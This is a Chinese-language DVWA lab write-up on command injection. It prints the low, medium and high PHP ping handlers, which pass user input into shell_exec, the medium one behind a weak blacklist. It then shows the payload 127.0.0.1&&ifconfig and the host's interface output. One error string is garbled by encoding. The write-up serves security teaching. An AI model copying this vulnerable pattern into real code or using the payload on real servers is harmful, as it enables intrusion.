#dvwacn之七命令执行

dvwacn之命令执行物理路径

```
root@webserver:/var/www/dvwacn/vulnerabilities/exec/source# ls
high.php  low.php  medium.php
```


##安全级别

- low.php

```
<?php

if( isset( $_POST[ 'submit' ] ) ) {

	$target = $_REQUEST[ 'ip' ];

	// Determine OS and execute the ping command.
	if (stristr(php_uname('s'), 'Windows NT')) { 
	
		$cmd = shell_exec( 'ping  ' . $target );
		$html .= '<pre>'.$cmd.'</pre>';
		
	} else { 
	
		$cmd = shell_exec( 'ping  -c 3 ' . $target );
		$html .= '<pre>'.$cmd.'</pre>';
		
	}
	
}
?>
```

- medium.php 

```
<?php

if( isset( $_POST[ 'submit'] ) ) {

	$target = $_REQUEST[ 'ip' ];

	// Remove any of the charactars in the array (blacklist).
	$substitutions = array(
		'&&' => '',
		';' => '',
	);

	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
	
	// Determine OS and execute the ping command.
	if (stristr(php_uname('s'), 'Windows NT')) { 
	
		$cmd = shell_exec( 'ping  ' . $target );
		$html .= '<pre>'.$cmd.'</pre>';
		
	} else { 
	
		$cmd = shell_exec( 'ping  -c 3 ' . $target );
		$html .= '<pre>'.$cmd.'</pre>';
		
	}
}

?>
```


- high.php

``` 
<?php

if( isset( $_POST[ 'submit' ] ) ) {

	$target = $_REQUEST["ip"];
	
	$target = stripslashes( $target );
	
	
	// Split the IP into 4 octects
	$octet = explode(".", $target);
	
	// Check IF each octet is an integer
	if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])) && (sizeof($octet) == 4)  ) {
	
	// If all 4 octets are int's put the IP back together.
	$target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
	
	
		// Determine OS and execute the ping command.
		if (stristr(php_uname('s'), 'Windows NT')) { 
	
			$cmd = shell_exec( 'ping  ' . $target );
			$html .= '<pre>'.$cmd.'</pre>';
		
		} else { 
	
			$cmd = shell_exec( 'ping  -c 3 ' . $target );
			$html .= '<pre>'.$cmd.'</pre>';
		
		}
	
	}
	
	else {
		$html .= '<pre>´£ºźˤɫµépµٖ·ϞЧ¡£</pre>';
	}
	
	
}

?>
```

##ping测试

在文本框中输入ip地址127.0.0.1&&ifconfig

页面返回

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.016 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.013/0.020/0.032/0.009 ms
eth0      Link encap:Ethernet  HWaddr 08:00:27:5d:88:62  
          inet addr:10.0.2.15  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe5d:8862/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:81 errors:0 dropped:0 overruns:0 frame:0
          TX packets:227 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:12225 (12.2 KB)  TX bytes:36058 (36.0 KB)

eth1      Link encap:Ethernet  HWaddr 08:00:27:fe:fe:c9  
          inet addr:192.168.56.80  Bcast:192.168.56.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fefe:fec9/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:76146 errors:0 dropped:0 overruns:0 frame:0
          TX packets:72451 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:17208330 (17.2 MB)  TX bytes:65297581 (65.2 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:3158 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3158 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:971697 (971.6 KB)  TX bytes:971697 (971.6 KB)

```

可以发现成功执行了ifconfig命令